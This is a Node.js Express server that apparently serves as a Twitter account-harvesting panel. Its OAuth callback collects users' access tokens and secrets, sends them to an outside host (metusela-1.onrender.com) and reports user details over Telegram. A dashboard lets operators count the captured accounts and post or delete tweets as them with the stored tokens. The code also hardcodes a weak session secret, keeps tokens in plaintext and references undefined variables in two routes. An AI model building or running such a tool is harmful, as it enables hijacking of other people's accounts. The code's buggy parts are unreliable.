const express = require('express');
//const fs = require('fs');
const path = require('path');
const session = require('express-session');
const bodyParser = require('body-parser');
const fs = require('fs-extra');
const bcrypt = require('bcryptjs');
const app = express();
const Twitter = require('twitter');
require('dotenv').config();
const multer = require('multer');
const BACKEND_URL = 'https://metusela-1.onrender.com/save-oauth';
const TWITTER_CONSUMER_API_KEY = process.env.TWITTER_CONSUMER_API_KEY;
const TWITTER_CONSUMER_API_SECRET_KEY = process.env.TWITTER_CONSUMER_API_SECRET_KEY;
// oauth-utilities.js
const {
  getOAuthRequestToken,
  getOAuthAccessTokenWith,
  oauthGetUserById,
  sendTelegramMessage
} = require('./oauth-utilities');
const upload = multer(); // Use Multer without storage settings for form data
const OAuth = require('oauth-1.0a');
const crypto = require('crypto');
const qs = require('querystring');
const axios = require('axios');

//const { TWITTER_CONSUMER_API_KEY, TWITTER_CONSUMER_API_SECRET_KEY } = process.env;

const endpointURL = 'https://api.twitter.com/2/tweets';

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));
require('dotenv').config();
app.use(express.urlencoded({ extended: true })); // Parse URL-encoded bodies
app.set('view engine', 'ejs'); // Set EJS as the templating engine
app.set('views', './views'); //

app.use(bodyParser.json()); // Middleware to parse JSON bodies

const PORT = process.env.PORT || 4000;
const DATA_FILE = path.join(__dirname, 'oauth_tokens.json');
const usersFile = path.join(__dirname, 'users.json');
const TweetFile = path.join(__dirname, 'tweets.json');
app.use(session({
    secret: '123456', // Replace with a strong secret key
    resave: false,
    saveUninitialized: true,
    cookie: { maxAge: 10 * 60 * 1000 } // 10 minutes
}));
// Middleware to parse request body
app.use(bodyParser.urlencoded({ extended: false }));
app.use(upload.none());
// Helper function to read users from JSON file
const readUsers = async () => {
  try {
    const data = await fs.readFile(usersFile, 'utf8');
    return JSON.parse(data);
  } catch (err) {
    if (err.code === 'ENOENT') {
      return [];
    }
    throw err;
  }
};

// Helper function to write users to JSON file
const writeUsers = async (users) => {
  await fs.writeFile(usersFile, JSON.stringify(users, null, 2));
};

// Route to display login form
app.get('/login', (req, res) => {
    res.render('login'); // Render the login.ejs template
});

app.post('/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        const users = await readUsers();
        const user = users.find(user => user.username === username);

        if (!user) {
            return res.status(400).send('Invalid Username or Password');
        }

        const isPasswordValid = bcrypt.compareSync(password, user.password);
        if (!isPasswordValid) {
            return res.status(400).send('Invalid Username or Password');
        }

        // Set session data
        req.session.user = { username: user.username };
        req.session.loggedAt = Date.now(); // Set the login time

        res.redirect('/');
    } catch (error) {
        console.log(error);
    }
});
// console.log( session.user);

// const getUsers = async(req,res)=>{
//   const users =  readData();
    
//   let username = req.session.user?.username;
    
//     // Find all entries with the particular username
//     const matchingUsers = users.filter(user => user.username === username);

//     // Count the number of matching entries
//     const count = matchingUsers.length;
//     return count;
// }
     
async function postTweetV2(oauthAccessToken, oauthAccessTokenSecret, status) {
  try {
    const ooauth = OAuth({
      consumer: {
        key: TWITTER_CONSUMER_API_KEY,
        secret: TWITTER_CONSUMER_API_SECRET_KEY
      },
      signature_method: 'HMAC-SHA1',
      hash_function: (baseString, key) => crypto.createHmac('sha1', key).update(baseString).digest('base64')
    });

    const token = {
      key: oauthAccessToken,
      secret: oauthAccessTokenSecret
    };

    const authHeader = ooauth.toHeader(ooauth.authorize({
      url: endpointURL,
      method: 'POST'
    }, token));

    const response = await axios.post(endpointURL, {
      text: status
    }, {
      headers: {
        Authorization: authHeader['Authorization'],
        'user-agent': 'v2CreateTweetJS',
        'content-type': 'application/json',
        accept: 'application/json'
      }
    });

    return response.data;
  } catch (error) {
    console.error('Error posting tweet:',  error.response ? error.response.data : error.message);
    throw new Error('Error posting tweet');
  }
}


async function deleteTweetV2(oauthAccessToken, oauthAccessTokenSecret, tweetId) {
  try {
    const ooauth = OAuth({
      consumer: {
        key: TWITTER_CONSUMER_API_KEY,
        secret: TWITTER_CONSUMER_API_SECRET_KEY
      },
      signature_method: 'HMAC-SHA1',
      hash_function: (baseString, key) => crypto.createHmac('sha1', key).update(baseString).digest('base64')
    });

    const token = {
      key: oauthAccessToken,
      secret: oauthAccessTokenSecret
    };

    const deleteEndpointURL = `${endpointURL}/${tweetId}`;
    
    const authHeader = ooauth.toHeader(ooauth.authorize({
      url: deleteEndpointURL,
      method: 'DELETE'
    }, token));

    const response = await axios.delete(deleteEndpointURL, {
      headers: {
        Authorization: authHeader['Authorization'],
        'user-agent': 'v2DeleteTweetJS',
        'content-type': 'application/json',
        accept: 'application/json'
      }
    });

    return response.data;
  } catch (error) {
    console.error('Error deleting tweet:',  error.response ? error.response.data : error.message);
    throw new Error('Error deleting tweet');
  }
}

let twitterClient;


function initializeTwitterClient(oauthAccessToken, oauthAccessTokenSecret) {
  twitterClient = new Twitter({
    consumer_key: TWITTER_CONSUMER_API_KEY,
    consumer_secret: TWITTER_CONSUMER_API_SECRET_KEY,
    access_token_key: oauthAccessToken,
    access_token_secret: oauthAccessTokenSecret,
  });
}
// Route to register a new user
app.post('/register', async (req, res) => {
  try {
    const { username, password } = req.body;
    const users = await readUsers();

    if (users.some(user => user.username === username)) {
      return res.status(400).send('Username already exists');
    }

    const hashedPassword = bcrypt.hashSync(password, 10);
    const newUser = { username, password: hashedPassword };

    users.push(newUser);
    await writeUsers(users);
    res.send('User Registered');
  } catch (error) {
    res.status(500).send('Internal Server Error');
  }
});

// Route to display registration form
app.get('/register', (req, res) => {
  res.send(`
    <form action="/register" method="post">
      <label for="username">Username:</label>
      <input type="text" id="username" name="username" required>
      <br>
      <label for="password">Password:</label>
      <input type="password" id="password" name="password" required>
      <br>
      <button type="submit">Register</button>
    </form>
  `);
});

app.get('/logout', (req, res) => {
    req.session.destroy(err => {
        if (err) {
            return res.status(500).send('Failed to log out');
        }
        res.redirect('/login'); // Redirect to login page after logout
    });
});

// Initialize the data file if it does not exist
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, JSON.stringify([]), 'utf8');
}

// Helper function to read data from JSON file
function readData() {
  const data = fs.readFileSync(DATA_FILE, 'utf8');
  return JSON.parse(data);
}
// Helper function to read data from JSON file
function readTweet() {
  const data = fs.readFileSync(TweetFile, 'utf8');
  return JSON.parse(data);
}
// Helper function to write data to JSON file
function writeTweet(newTweet) {
  let existingTweets = [];

  // Check if the file exists and read existing tweets
  if (fs.existsSync(TweetFile)) {
    const data = fs.readFileSync(TweetFile, 'utf8');
    if (data) {
      existingTweets = JSON.parse(data);
    }
  }

  // Add the new tweet to the existing tweets
  existingTweets.push(newTweet);

  // Write the updated tweets back to the file
  fs.writeFileSync(TweetFile, JSON.stringify(existingTweets, null, 2), 'utf8');
}
// Helper function to write data to JSON file
function writeData(newData) {
  let existingData = [];

  // Check if the file exists and read existing data
  if (fs.existsSync(DATA_FILE)) {
    const data = fs.readFileSync(DATA_FILE, 'utf8');
    if (data) {
      existingData = JSON.parse(data);
    }
  }

  // Add the new data to the existing data
  existingData.push(newData);

  // Write the updated data back to the file
  fs.writeFileSync(DATA_FILE, JSON.stringify(existingData, null, 2), 'utf8');
}

// Middleware to check if user is logged in
function isAuthenticated(req, res, next) {
    if (req.session.user && req.session.loggedAt) {
        // Check if the session has expired
        const now = Date.now();
        const elapsedTime = now - req.session.loggedAt;

        if (elapsedTime > 10 * 60 * 1000) { // 10 minutes in milliseconds
            // Log out the user
            req.session.destroy((err) => {
                if (err) {
                    return next(err);
                }
                return res.redirect('/login');
            });
        } else {
            // Reset the timer
            req.session.loggedAt = now;
            return next();
        }
    } else {
         res.redirect('/login')
    }
}


app.get('/', isAuthenticated, (req, res) => {
    const usersData =  readData();
    const tweetData =  readTweet();
   let username = req.session.user?.username;
    
    // Find all entries with the particular username
    const matchingUsers = usersData.filter(user => user.username === username);
    const matchingTweets = tweetData.filter(tweet => tweet.account === username);
    // Count the number of matching entries
    const count = matchingUsers.length;
    const Tcount = matchingTweets.length;
    res.render('dashboard',{count: count,Tcount:Tcount}); // Render the dash.ejs template
});
app.get('/accounts', isAuthenticated, (req, res) => {
    const usersData =  readData();
    
    let username = req.session.user?.username;
    
    // Pagination parameters
    const page = parseInt(req.query.page) || 1; // Current page number
    const limit = parseInt(req.query.limit) || 10; // Number of items per page

    // Find all entries with the particular username
    const matchingUsers = usersData.filter(user => user.username === username);

    // Calculate pagination details
    const totalUsers = matchingUsers.length;
    const totalPages = Math.ceil(totalUsers / limit);
    const startIndex = (page - 1) * limit;
    const endIndex = Math.min(startIndex + limit, totalUsers);

    // Slice the array to get only the items for the current page
    const paginatedUsers = matchingUsers.slice(startIndex, endIndex);

    // Render the accounts template with paginatedUsers and pagination details
    res.render('accounts', {
        users: paginatedUsers,
        currentPage: page,
        totalPages: totalPages,
        limit: limit
    });
   //let username = req.session.user?.username;
    
    // Find all entries with the particular username
    //const matchingUsers = usersData.filter(user => user.username === username);

    // Count the number of matching entries
    //const count = matchingUsers.length;
    //res.render('accounts',{users: matchingUsers }); // Render the dash.ejs template
});
app.get('/manage', isAuthenticated, (req, res) => {
    const userId = req.query.userId;
    const account = req.query.account;
    const usersData = readTweet();

    // Filter usersData based on userId and account
    const matchingUsers = usersData.filter(tweet => tweet.userId === userId && tweet.account === account);

    // Pass filtered data to the view
    res.render('manage', { matching: matchingUsers });
});

// app.post('/tweet', async (req, res) => {
//     try {
//       const usersData =  readData();
//       const { id , oauthAccessToken, oauthAccessTokenSecret, status} = req.body;
//        if (!oauthAccessToken || !oauthAccessTokenSecret || !id || !status ) {
//         return res.status(401).send('Unauthorized');
//       }
//       //const { twitter_screen_name } = req.cookies;
//       const matchingUsers = usersData.filter(user => user.id === id);
//       let uname = matchingUsers.name
     

//       const statusUser = status;
//       const response = await postTweetV2(oauthAccessToken, oauthAccessTokenSecret, statusUser);

//       res.send(`Tweet successfully posted by ${uname}: ${response.data.text}`);
//     } catch (error) {
//       console.error('Error posting tweet:', error.message);
//       res.status(500).send('Error posting tweet');
//     }
//   });
// Endpoint to receive OAuth details
console.log('hey:',TWITTER_CONSUMER_API_KEY);
app.post('/tweet', async (req, res) => {
    try {
        let username = req.session.user?.username;
        const usersData = readData();
        const { uid, oauthAccessToken, oauthAccessTokenSecret, status } = req.body;
         console.log(req.body)
        // if (!oauthAccessToken || !oauthAccessTokenSecret || !uid || !status) {
        //     return res.status(401).send('Unauthorized');
        // }
        const uuid = parseInt(uid, 10);
        const matchingUsers = usersData.filter(user => user.id === uuid);
        console.log(matchingUsers)
        // if (matchingUsers.length === 0) {
        //     return res.status(404).send('User not found');
        // }

        let uname = matchingUsers[0].name;

        const statusUser = status;
        const response = await postTweetV2(oauthAccessToken, oauthAccessTokenSecret, statusUser);

        // Save tweet ID and user details
        const tweetId = response.data.id;
        const tweetData = {
            id: tweetId,
            userId: uid,
            account: username,
            oauthAccessToken,
            oauthAccessTokenSecret,
            status: statusUser,
            uname
        };

        usersData.push(tweetData);
        writeTweet(usersData);

        res.json({ success: true, message: `Tweet successfully posted by ${uname}: ${response.data.text}` });
    } catch (error) {
        console.error('Error posting tweet:', error.message);
        res.status(500).json({ success: false, message: 'Error posting tweet' });
    }
});

app.post('/delete-tweet', async (req, res) => {
    try {
        const usersData = readData();
        const { tweetId, userId, oauthAccessToken, oauthAccessTokenSecret } = req.body;

        // if (!tweetId || !userId || !oauthAccessToken || !oauthAccessTokenSecret) {
        //     return res.status(401).send('Unauthorized');
        // }

        // Delete the tweet using Twitter API (You need to implement this function)
        await deleteTweetV2(oauthAccessToken, oauthAccessTokenSecret, tweetId);

        // Remove the tweet data from usersData
        const updatedUsersData = usersData.filter(tweet => tweet.id !== tweetId || tweet.userId !== userId);
        writeTweet(updatedUsersData);

        res.json({ success: true, message: `Tweet deleted posted by ${uname}: ${response.data.text}` });
    } catch (error) {
        console.error('Error deleting tweet:', error.message);
        res.status(500).json({ success: false, message: 'Error deleting tweet' });
    }
});
app.get('/TweeterOauth', async(req,res) =>{
   const authorizationUrl = req.query.authorizationUrl;
   const mainUrl = req.query.mainUrl;
   const oauthsecr = req.query.oauthRequestTokenSecret;
   req.session = req.session || {};
   req.session.aurl = authorizationUrl;
   req.session.siteUrl = mainUrl;
   req.session.oauthRequestTokenSecret = oauthsecr;
   var URT = `https://api.twitter.com/oauth/authorize?oauth_token=${authorizationUrl}`;
   res.redirect(URT)
});
app.get('/callback', async (req, res) => {
    try {
     // const callurl = req.query
      const oauthRequestToken = req.session.aurl;
      const oauthRequestTokenSecret = req.session.oauthRequestTokenSecret;
      //const { oauthRequestToken, oauthRequestTokenSecret } = req.session;
      const { oauth_verifier: oauthVerifier } = req.query;
      console.log('/twitter/callback', { oauthRequestToken, oauthRequestTokenSecret, oauthVerifier });

      const { oauthAccessToken, oauthAccessTokenSecret, results } = await getOAuthAccessTokenWith({
        oauthRequestToken,
        oauthRequestTokenSecret,
        oauthVerifier
      });
      //req.session.oauthAccessToken = oauthAccessToken;
      //req.session.oauthAccessTokenSecret = oauthAccessTokenSecret;

      //console.log('Obtained OAuth access token:', { oauthAccessToken, oauthAccessTokenSecret, results });
      
      const user = await oauthGetUserById();
      console.log('Fetched user data:', user);
      
      req.session.twitter_screen_name = user.screen_name;
      res.cookie('twitter_screen_name', user.screen_name, { maxAge: 900000, httpOnly: true });
      let url = req.session.siteUrl;
      
    
      // Remove the last '/'
      //username = url.replace(/\/$/, '');
      // Send OAuth details to the backend URL
      await axios.post(BACKEND_URL, {
        screen_name: user.screen_name,
        id: user.id,
        name: user.name,
        profilepic: user.profile_image_url_https,
        username: username,
        oauthAccessToken,
        oauthAccessTokenSecret
      });

      var frs = JSON.stringify(user, null, 2);
      var message = `OAuth Results: ${frs}`; 
      console.log(message);
      var response = sendTelegramMessage(message);
      console.log('User successfully logged in with Twitter', user.screen_name);
      res.redirect(mainUrl);
    } catch (error) {
      console.error('Error during callback:', error.message);
      console.error('Error details:', error);
      res.status(500).send('Error during callback');
    }
  });
app.post('/save-oauth', (req, res) => {
  const { screen_name, id, name, profilepic, username, oauthAccessToken, oauthAccessTokenSecret } = req.body;

  if (!screen_name || !username || !oauthAccessToken || !oauthAccessTokenSecret) {
    return res.status(400).send('Missing required fields');
  }

  const data = readData();
  const index = data.findIndex(item => item.screen_name === screen_name);

  if (index !== -1) {
    // Update existing record
    data[index] = { screen_name, id, name, profilepic, username, oauthAccessToken, oauthAccessTokenSecret };
  } else {
    // Insert new record
    data.push({ screen_name, username, oauthAccessToken, oauthAccessTokenSecret });
  }

  writeData(data);

  res.status(200).send('OAuth details saved successfully');
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
